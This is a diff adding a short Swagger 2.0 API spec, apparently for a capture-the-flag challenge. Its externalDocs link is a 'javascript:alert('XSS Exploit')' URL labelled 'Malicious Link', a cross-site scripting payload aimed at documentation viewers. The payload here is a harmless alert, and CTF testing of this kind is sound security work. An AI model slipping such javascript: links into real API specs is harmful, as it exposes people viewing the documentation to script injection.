@@ -1,0 +1,22 @@
+swagger: "2.0"
+info:
+  version: "2.0.0"  # Updated to match the version you want to reflect
+  title: "CTF Swagger API"
+  description: "payload"
+  apiVersion: ["2.0.0", "3.0.0"]  # Added this to reflect the provided API versions
+host: "api.mrgreen.com"
+schemes:
+  - "https"
+paths:
+  /example:
+    get:
+      summary: "Example Endpoint"
+      description: "Click the link to trigger the payload."
+      responses:
+        200:
+          description: "Successful Response"
+          schema:
+            type: "string"
+      externalDocs:
+        description: "Malicious Link"
+        url: "javascript:alert('XSS Exploit')"
